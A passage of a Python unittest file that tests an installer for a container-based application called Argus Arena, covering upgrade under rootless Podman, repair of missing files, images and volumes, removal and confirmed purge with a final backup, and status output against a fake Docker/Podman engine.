    def test_On_rootless_Podman_the_backup_is_yours_and_Docker_only_looked_at(self):
        podman = {"FAKE_STATE_ENGINE": "podman", "FAKE_VOLUMES": "arena_engine\narena_argus"}
        deploy = self.old_install(version_file=True, running=False)
        subprocess.run(["podman", "compose", "-f", "docker-compose.yml", "-f", "podman.yml", "up", "-d"], cwd=deploy,
                       env=self.r.env(podman), check=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", extra=podman)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("(podman, project arena)", r.stdout)
        # The container's root is this user under rootless Podman: its uid 1000 is another host uid,
        # whose files this user could not read back to check the backup.
        snapshots = [" ".join(c) for c in self.r.calls() if c[:2] == ["podman", "run"] and "python -c" in " ".join(c)]
        self.assertTrue(snapshots)
        for call in snapshots:
            self.assertIn("chown 0:0 /out/", call)
        # Docker is only asked whether it runs the project (it does not: the engine is Podman).
        self.assertFalse([c for c in self.r.calls() if c[0] == "docker" and c[1] not in ("info", "ps")])
        self.assertIn("Upgraded from 5.2.0 to 9.9.9", r.stdout)
        # Podman held the release's names twice: the new under localhost/, 5.2.0's as it was loaded.
        images = self.r.store()["images"]
        self.assertIn("localhost/arena-app:latest", images)
        self.assertIn("arena-app:latest", images)
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", extra=podman)
        self.assertEqual(r.returncode, 0, self.output(r))
        left = [ref for ref in self.r.store()["images"] if "arena-" in ref]
        self.assertEqual(left, [], r.stdout)

    def test_Upgrade_refuses_a_bundle_without_an_image_the_host_runs(self):
        self.old_install(version_file=True)
        copy = self.damaged_copy()
        manifest = copy / "MANIFEST"
        manifest.write_text(manifest.read_text().replace("left-out: \n", "left-out: argus\n"))
        subprocess.run("sha256sum $(sed -E 's/^[0-9a-f]{64} [ *]//' SHA256SUMS) > S && mv S SHA256SUMS", shell=True, cwd=copy, check=True)
        r = subprocess.run(["bash", str(copy / "installer.sh"), "upgrade", "--dir", str(self.dir), "--yes"], env=self.r.env(),
                           capture_output=True, text=True, stdin=subprocess.DEVNULL)
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("this bundle has no image for argus, which runs here", r.stderr)

    # ----------------------------------------------------------------- repair

    def test_Repair_puts_back_a_file_an_image_and_a_container(self):
        self.install()
        deploy = self.dir / "deploy"
        (deploy / "config" / "added.yml").unlink()
        (deploy / "config" / "litellm.yaml").write_text("changed by hand\n")
        store = self.r.store()
        del store["images"]["arena-web:9.9.9"]
        next(c for c in store["containers"] if c["service"] == "argus")["state"] = "exited"
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        self.assertIn("done   restored config/added.yml (it was missing)", out)
        self.assertIn("done   put back config/litellm.yaml", out)
        self.assertEqual((deploy / "config" / "litellm.yaml").read_text(), "model_list: []\n")
        self.assertEqual([p.read_text() for p in (deploy / "config").glob("litellm.yaml.changed-*")], ["changed by hand\n"])
        self.assertIn("missing or not the release's: arena-web:9.9.9", out)
        self.assertIn("loaded arena-web:9.9.9", out)
        self.assertIn("argus (argus): exited", out)
        self.assertIn("Repaired:", out)
        self.assertEqual({c["state"] for c in self.containers()}, {"running"})
        # Again: nothing to do.
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("every file of 9.9.9 is there, as it was shipped", r.stdout)

    def test_Repair_gives_a_volume_back_to_its_service(self):
        self.install()
        store = self.r.store()
        store["volumes"]["arena_argus"] = {"labels": []}
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s", extra={"FAKE_OWNER_argus": "0:0"})
        self.assertIn("the argus volume was 0:0's: now 10001:10001's", r.stdout)
        self.assertTrue(any(c[-3:] == ["chown", "-R", "10001:10001"] or "10001:10001" in c for c in self.r.calls() if "chown" in c))

    # ----------------------------------------------------------------- remove

    def test_Remove_keeps_the_data_and_what_was_here_before(self):
        self.install()
        store = self.r.store()
        store["volumes"]["arena_postgres"] = {"labels": ["com.docker.compose.project=arena"]}
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("remove", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        images = self.r.store()["images"]
        self.assertEqual(self.containers(), [])
        for gone in ("arena-app:9.9.9", "arena-app:latest", "arena-web:9.9.9"):
            self.assertNotIn(gone, images)
        for kept in ("traefik:v3.6.7", "python:3.13-slim"):
            self.assertIn(kept, images)
        self.assertIn("kept traefik:v3.6.7: on this host before Argus Arena was installed", r.stdout)
        self.assertIn("arena_postgres", self.r.store()["volumes"])
        self.assertTrue((self.dir / "deploy" / ".env").is_file())
        r = self.r.run("remove", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        # And back: install over it brings it up on the same data.
        self.install()

    def test_Purge_asks_for_the_word_and_offers_a_last_backup(self):
        self.install()
        store = self.r.store()
        store["volumes"]["arena_postgres"] = {"labels": ["com.docker.compose.project=arena"]}
        self.r.state.write_text(json.dumps(store))
        for args, message in [
            ([], "unattended, it needs --confirm PURGE"),
            (["--confirm", "purge"], "--confirm takes the word PURGE"),
            (["--confirm", "PURGE", "--final-backup", str(self.dir / "inside")], "must go outside"),
        ]:
            r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", *args)
            self.assertEqual(r.returncode, 3, (args, self.output(r)))
            self.assertIn(message, r.stderr, args)
            self.assertTrue((self.dir / "deploy" / ".env").is_file())
            self.assertIn("arena_postgres", self.r.store()["volumes"])
            self.assertTrue(self.containers())
        final = self.r.s.dir / "final"
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", "--confirm", "PURGE", "--final-backup", str(final))
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertEqual(len(list(final.glob("20*"))), 1)
        self.assertNotIn("arena_postgres", self.r.store()["volumes"])
        self.assertFalse((self.dir / "deploy").exists())
        self.assertTrue(list((self.dir / ".arena-install" / "logs").glob("remove-*.log")))
        self.assertIn("traefik:v3.6.7", self.r.store()["images"])

    def test_Purge_keeps_the_files_of_a_folder_it_did_not_make(self):
        deploy = self.old_install()
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", "--confirm", "PURGE")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertFalse((deploy / ".env").exists())
        self.assertFalse((deploy / "certs" / "tls.key").exists())
        self.assertTrue((deploy / "docker-compose.yml").is_file())
        self.assertTrue((deploy / "certs" / "README.md").is_file())

    def test_Remove_leaves_a_stack_started_from_another_folder(self):
        self.install()
        store = self.r.store()
        for c in store["containers"]:
            c["workdir"] = "/somewhere/else/deploy"
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("remove", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("was started from /somewhere/else/deploy", r.stderr)
        self.assertEqual(len(self.containers()), len(SERVICES.split()))

    # ----------------------------------------------------------------- status

    def test_Status_says_what_runs_and_what_does_not(self):
        self.install()
        r = self.r.run("status", "--dir", str(self.dir), via_run=True)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("installed: 9.9.9 (this installer's record)", r.stdout)
        self.assertIn("installed: 9.9.9", "".join(p.read_text() for p in (self.dir / ".arena-install" / "logs").glob("status-*.log")))
        self.assertIn("(says 9.9.9)", r.stdout)
        self.assertIn("Every service is up.", r.stdout)
        store = self.r.store()
        next(c for c in store["containers"] if c["service"] == "web")["health"] = "unhealthy"
        self.r.state.write_text(json.dumps(store))
        r = subprocess.run(["bash", str(self.dir / "deploy" / "scripts" / "installer.sh"), "status"], env=self.r.env(), capture_output=True, text=True)
        self.assertEqual(r.returncode, 1, self.output(r))
        self.assertIn("1 service(s) not up or not healthy", r.stdout)


if __name__ == "__main__":
    unittest.main()
